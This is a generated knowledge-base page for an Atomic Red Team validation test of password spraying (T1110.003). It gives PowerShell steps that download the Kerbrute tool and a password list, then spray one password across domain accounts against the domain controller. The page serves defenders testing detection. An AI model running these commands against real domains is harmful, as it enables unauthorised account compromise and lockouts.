---
atomic_guid: "c6f25ec3-6475-47a9-b75d-09ac593c5ecb"
title: "Password Spray using Kerbrute Tool"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.003"
attack_technique_name: "Brute Force: Password Spraying"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "c6f25ec3-6475-47a9-b75d-09ac593c5ecb"
  - "Password Spray using Kerbrute Tool"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Password Spray using Kerbrute Tool

Test a single password against a list of users

## Metadata

- Atomic GUID: c6f25ec3-6475-47a9-b75d-09ac593c5ecb
- Technique: T1110.003: Brute Force: Password Spraying
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1110.003/T1110.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force|T1110.003]]

## Input Arguments

### domain

- description: Domain where you will be testing
- type: string
- default: $ENV:userdomain

### domaincontroller

- description: Domain controller where test will be run
- type: string
- default: $ENV:userdnsdomain

## Dependencies

kerbrute.exe must exist in PathToAtomicsFolder\..\ExternalPayloads

### Prerequisite Check

```powershell
if (test-path "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"){exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\kerbrute.exe"
```

passwordspray.txt must exist in PathToAtomicsFolder\..\ExternalPayloads

### Prerequisite Check

```powershell
if (test-path "PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt"){exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/src/passwordspray.txt?raw=true" -outfile "PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt"
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
cd "PathToAtomicsFolder\..\ExternalPayloads"
.\kerbrute.exe passwordspray --dc #{domaincontroller} -d #{domain} "PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt" password132
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml)
